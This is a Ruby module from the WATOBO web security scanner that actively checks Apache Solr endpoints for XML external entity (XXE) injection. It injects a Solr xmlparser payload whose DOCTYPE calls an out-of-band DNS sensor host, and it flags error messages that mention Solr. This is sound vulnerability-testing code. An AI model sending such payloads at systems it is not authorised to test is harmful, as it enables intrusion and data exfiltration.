# @private
module Watobo #:nodoc: all
  module Modules
    module Active
      module Apache


        class Solr_xxe < Watobo::ActiveCheck

          threat = <<'EOF'
Possible XXE in SOLR XML parser can lead to exfiltration of sensitive data.
EOF

          measure = "Disable External Entity Resolving in XML Parser"

          @info.update(
              :check_name => 'Apache SOLR XXE', # name of check which briefly describes functionality, will be used for tree and progress views
              :check_group => AC_GROUP_APACHE,
              :description => "Check for XXE vulnerabilities.", # description of checkfunction
              :author => "Andreas Schmidt", # author of check
              :version => "1.0" # check version
          )

          @finding.update(
              :threat => threat, # thread of vulnerability, e.g. loss of information
              :class => AC_GROUP_APACHE_SOLR, # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
              :type => FINDING_TYPE_VULN, # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
              :rating => VULN_RATING_MEDIUM,
              :measure => measure
          )

          def initialize(project, prefs = {})
            super(project, prefs)

          end


          def generateChecks(chat)
            #
            #  Check GET-Parameters
            #
            begin


              @parm_list = chat.request.parameters
              @parm_list.each do |param|
                checker = proc {
                  test = chat.copyRequest
                  parm = param.copy

                 inj = '{!xmlparser v=\'<!DOCTYPE a SYSTEM "http://solr-xxe-' + SecureRandom.hex(3) + '.' + Watobo::Conf::Scanner.dns_sensor + '/xxx\"><a></a>\'}'
                  if parm.location == :url
                    parm.value = URI.escape(inj)
                  else
                    parm.value = inj
                  end

                  test.set parm

                  test_request, test_response = doRequest(test)

                  # first we check if an error has been raised containing the keyword solr

                  if test_response.join =~ /org.apache.solr/i
                    puts '!!! GOTCHA !!!! FOUND SOLR Vulnerability' if $VERBOSE
                    match = $1

                    addFinding(test_request, test_response,
                               # :check_pattern => "#{Regexp.quote(parm.value)}",
                               :check_pattern => "#{parm.value}",
                               :proof_pattern => "#{match}",
                               :test_item => "#{parm.name}",
                               :chat => chat,
                               :title => "[#{parm.name}] - #{test_request.path}",
                               :rating => VULN_RATING_LOW,
                               :measure => "Remove error messages from response.",
                               :class => "#{AC_GROUP_APACHE_SOLR} Error Message"
                    )
                  end

                  [test_request, test_response]
                }
                yield checker
              end
            end

          rescue => bang
            puts bang
            puts bang.backtrace if $DEBUG
            puts "ERROR!! #{Module.nesting[0].name}"
            raise


          end
        end

      end

    end
  end
end

